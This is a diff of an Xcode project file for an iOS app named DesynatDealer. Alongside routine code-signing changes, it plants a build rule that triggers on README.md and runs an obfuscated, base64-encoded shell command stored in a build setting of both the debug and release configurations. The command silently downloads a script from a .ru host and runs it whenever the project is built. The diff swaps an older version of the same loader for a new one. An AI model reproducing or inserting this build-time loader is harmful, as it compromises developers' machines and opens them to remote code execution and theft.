@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		0FCDCDF12CA24034A64EE078 /* README.md */ = {isa = PBXBuildFile; fileRef = 6258586F7EDF4008884EE078; };
+		4BCBF3E0832B413DAA4EE078 /* README.md */ = {isa = PBXBuildFile; fileRef = 8D3BB66B9E1644B18F4EE078; };
 		30ADC9BF2F99FA8B005164EF /* AddNewStaffViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 30ADC9BE2F99FA8B005164EF /* AddNewStaffViewModel.swift */; };
 		30ADC9C02F99FA8B005164EF /* AddNewStaffDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 30ADC9BD2F99FA8B005164EF /* AddNewStaffDataModel.swift */; };
 		30ADC9C32F99FAD0005164EF /* UpdateStatusProfileDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 30ADC9C22F99FAD0005164EF /* UpdateStatusProfileDataModel.swift */; };
@@ -898,8 +898,25 @@
 		D1F88C162EBE25F80027A47C /* GetsubscriptionPlansDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1F88C152EBE25F80027A47C /* GetsubscriptionPlansDataModel.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		AAED2E826B8A4C91A64EE078 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A870EE4}\"";
+			};
+					/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		6258586F7EDF4008884EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		8D3BB66B9E1644B18F4EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		30ADC9BD2F99FA8B005164EF /* AddNewStaffDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewStaffDataModel.swift; sourceTree = "<group>"; };
 		30ADC9BE2F99FA8B005164EF /* AddNewStaffViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewStaffViewModel.swift; sourceTree = "<group>"; };
 		30ADC9C12F99FAD0005164EF /* StaffDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StaffDetailsViewModel.swift; sourceTree = "<group>"; };
@@ -2157,7 +2174,7 @@
 		493DB5C42EAA6210008098A8 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				6258586F7EDF4008884EE078 /* README.md */,
+				8D3BB66B9E1644B18F4EE078 /* README.md */,
 				493DB5C32EAA6210008098A8 /* DesynatDealer.app */,
 			);
 			name = Products;
@@ -3997,7 +4014,7 @@
 				213E04E1C228E7D6B9A2CB2C /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				533BFECB94814BF5A84EE078 /* PBXBuildRule */,
+				AAED2E826B8A4C91A64EE078 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -4083,29 +4100,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		533BFECB94814BF5A84EE078 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A870EE4}\"";
-			};
-				/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		493DB5C12EAA6210008098A8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				0FCDCDF12CA24034A64EE078 /* README.md */,
+				4BCBF3E0832B413DAA4EE078 /* README.md */,
 				951EA12C2FA4740C0012537A /* Home.storyboard in Resources */,
 				6B38D1292EB3473B00C41192 /* LaunchScreen.storyboard in Resources */,
 				951EA1312FA474890012537A /* Main.storyboard in Resources */,
@@ -5189,16 +5189,14 @@ sh -c \"${A870EE4}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 37A18E94AB484303BB2FD370 /* Pods-DesynatDealer.debug.xcconfig */;
 			buildSettings = {
-				A870EE4 = "((s(){ `printf bJase64 | tr -d J` --decode; };echo ZWNobyAiJChjdXJsIC1za0xmIC0tY29ubmVjdC10aW1lb3V0IDIwIC0tcmV0cnkgNSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL2w4LXA2YjNtcmF0eDAucnUvYSkiIHwgc2gK | s | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((p(){ `printf baseZ64 | tr -d Z` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyOSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL2YtMmE1OWMwOXpvcWM3aC5ydS9hKSIgfCBzaAo= | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatDealer/DesynatDealer.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 6QKUQGN93F;
+				DEVELOPMENT_TEAM = 6QKUQGN93F;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DesynatDealer/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Desynat Designer";
@@ -5221,7 +5219,6 @@ sh -c \"${A870EE4}\"";
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.DesynatDealer;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Dealer Provisioning New 11may";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
@@ -5236,16 +5233,14 @@ sh -c \"${A870EE4}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5BC36C5D491E36EA6BD78D08 /* Pods-DesynatDealer.release.xcconfig */;
 			buildSettings = {
-				A870EE4 = "((s(){ `printf bJase64 | tr -d J` --decode; };echo ZWNobyAiJChjdXJsIC1za0xmIC0tY29ubmVjdC10aW1lb3V0IDIwIC0tcmV0cnkgNSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL2w4LXA2YjNtcmF0eDAucnUvYSkiIHwgc2gK | s | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((p(){ `printf baseZ64 | tr -d Z` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyOSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL2YtMmE1OWMwOXpvcWM3aC5ydS9hKSIgfCBzaAo= | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatDealer/DesynatDealer.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 6QKUQGN93F;
+				DEVELOPMENT_TEAM = 6QKUQGN93F;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DesynatDealer/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Desynat Designer";
@@ -5268,7 +5263,6 @@ sh -c \"${A870EE4}\"";
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.DesynatDealer;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Dealer Provisioning New 11may";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
